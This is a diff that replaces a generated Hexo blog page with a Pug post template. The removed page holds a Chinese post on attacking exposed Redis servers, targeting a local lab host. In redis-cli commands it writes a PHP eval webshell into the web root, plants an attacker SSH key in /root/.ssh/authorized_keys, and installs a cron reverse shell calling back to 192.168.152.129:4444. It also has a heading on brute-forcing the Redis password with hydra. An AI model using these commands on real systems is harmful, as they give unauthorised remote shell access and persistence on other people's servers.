@@ -1,217 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="keyword" content="">
-    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
+extends includes/layout
 
-    <title>
-        
-        Redis学习详解 - undefined
-        
-    </title>
+block content
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
-    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
-    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
-    <!-- ga & ba script hoook -->
-    <script></script>
-</head>
+    section#wrapper.post
+        article
+            header
+                h1!=page.title
+                h2.headline!=date(page.date, 'MMM DD, YYYY h:mm')
+                    |·
+                    |#{wordcount(page.content)} words
+                    |·
+                    |#{min2read(page.content)} minutes read
+                    span.tags
 
-<body>
+            if toc(page.content)
+                div#toc!=toc(page.content,{list_number:false})
 
-<div class="site-nav-toggle" id="site-nav-toggle">
-    <button>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-    </button>
-</div>
+            section#post-body!=page.content
 
-<div class="index-about">
-    <i>  </i>
-</div>
+            - var prev = page.prev ? page.prev.path : false;
+            - var next = page.next ? page.next.path : false;
+            nav#post-nav
+                span.prev
+                    if page.prev
+                        a(href=url_for(prev))
+                            span.arrow ←
+                            | Newer Posts
+                span.next
+                    if page.next
+                        a(href=url_for(next))
+                            | Older Posts
+                            span.arrow →
 
-<div class="index-container">
-    
-    <div class="index-left">
-        
-<div class="nav" id="nav">
-    <div class="avatar-name">
-        <div class="avatar ">
-            <img src="/c1y2m3.github.io/">
-        </div>
-        <div class="name">
-            <i>John Doe</i>
-        </div>
-    </div>
-    <div class="contents" id="nav-content">
-        <ul>
-            <li>
-                <a href="/c1y2m3.github.io/">
-                    <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/tags">
-                    <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/archives">
-                    <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/about/">
-                    <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-    
-        <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#REmote-DIctionary-Server-Redis-是一个key-value数据库"><span class="toc-text">REmote DIctionary Server(Redis)是一个key-value数据库</span></a></li></ol><li class="toc-item toc-level-5"><a class="toc-link" href="#在web目录下写入webshell"><span class="toc-text">在web目录下写入webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#写入ssh公钥，获取操作系统权限"><span class="toc-text">写入ssh公钥，获取操作系统权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用hydra暴力破解redis的密码"><span class="toc-text">利用hydra暴力破解redis的密码</span></a>
-</li></div>
-    
-</div>
-
-
-<div class="search-field" id="search-field">
-    <div class="search-container">
-        <div class="search-input">
-            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input">
-            <span id="begin-search">search</span>
-        </div>
-        <div class="search-result-container" id="search-result-container">
-
-        </div>
-    </div>
-</div>
-
-        <div class="index-about-mobile">
-            <i>  </i>
-        </div>
-    </div>
-    
-    <div class="index-middle">
-        <!-- Main Content -->
-        
-
-
-<div class="post-container">
-    <div class="post-title">
-        Redis学习详解
-    </div>
-
-    <div class="post-meta">
-        <span class="attr">Post：<span>2018-09-26 00:34:14</span></span>
-        
-        
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
-</span>
-
-    </div>
-    <div class="post-content ">
-        <ol>
-<li><p>环境:Ubantu  redis_version:4.0.11</p>
-<ol start="2">
-<li>默认端口 :6379<br>安装过程:</li>
-</ol>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bab4d3f2711cd3c90efaa15" alt=""></p>
-</li>
-</ol>
-<h6 id="REmote-DIctionary-Server-Redis-是一个key-value数据库"><a href="#REmote-DIctionary-Server-Redis-是一个key-value数据库" class="headerlink" title="REmote DIctionary Server(Redis)是一个key-value数据库"></a>REmote DIctionary Server(Redis)是一个key-value数据库</h6><p><code>info</code> Redis版本和服务器上内核版本信息，以及配置文件绝对路径。</p>
-<p><code>keys *</code> 参考Key值 <code>get key</code>   对应的值<br><code>flushall</code> 删除所有数据  <code>del key</code>删除键为key的数据</p>
-<h5 id="在web目录下写入webshell"><a href="#在web目录下写入webshell" class="headerlink" title="在web目录下写入webshell"></a>在web目录下写入webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">set 1 &quot;test&quot;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</span><br><span class="line">config set dbfilename webshell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<h5 id="写入ssh公钥，获取操作系统权限"><a href="#写入ssh公钥，获取操作系统权限" class="headerlink" title="写入ssh公钥，获取操作系统权限"></a>写入ssh公钥，获取操作系统权限</h5><p>将本机的公钥作为value，key值随意，然后通过修改数据库默认路径和缓冲文件，把缓冲文件写在文件里，等于在服务端/root/.ssh下生成授权的key.</p>
-<p>客户端生成Key: ssh-keygen -t rsa</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line"></span><br><span class="line">把key.txt文件内容写入目标主机的缓冲里：</span><br><span class="line">cat kali.txt|redis-cli -h 127.0.0.1 -x set xxx </span><br><span class="line">OK</span><br><span class="line">设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</span><br><span class="line">redis-cli -h 127.0.0.1 config set dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">将数据保存在服务器硬盘上</span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
-<p>目标主机查看写入keys内容:</p>
-<p><code>cat /root/.ssh/authorized_keys</code></p>
-<ul>
-<li><ul>
-<li></li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>未复现成功。<br>在crontab里写定时任务，反弹shell，原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</li>
-</ul>
-<p>本机监听:</p>
-<p><code>nc -l 2222</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">连接redis，写入反弹shell</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-<h5 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h5><p><img src="https://www.yunzhijia.com/microblog/filesvr/5bab575a50f8dd17df3a4eab" alt=""></p>
-
-        
-        <br>
-        <div id="comment-container">
-        </div>
-        <div id="disqus_thread"></div>
-
-        <div id="lv-container">
-        </div>
-
-    </div>
-</div>
-
-    </div>
-</div>
-
-
-<footer class="footer">
-    <ul class="list-inline text-center">
-        
-        
-
-        
-
-        
-
-        
-
-        
-
-    </ul>
-    
-    <p>
-        <span id="busuanzi_container_site_pv">
-            <span id="busuanzi_value_site_pv"></span>PV
-        </span>
-        <span id="busuanzi_container_site_uv">
-            <span id="busuanzi_value_site_uv"></span>UV
-        </span>
-        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
-</footer>
+            include includes/comment.pug
 
 
 
 
-</body>
-
-<script>
-    // We expose some of the variables needed by the front end
-    window.hexo_search_path = ""
-    window.hexo_root = "/c1y2m3.github.io/"
-    window.isPost = true
-</script>
-<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-</html>
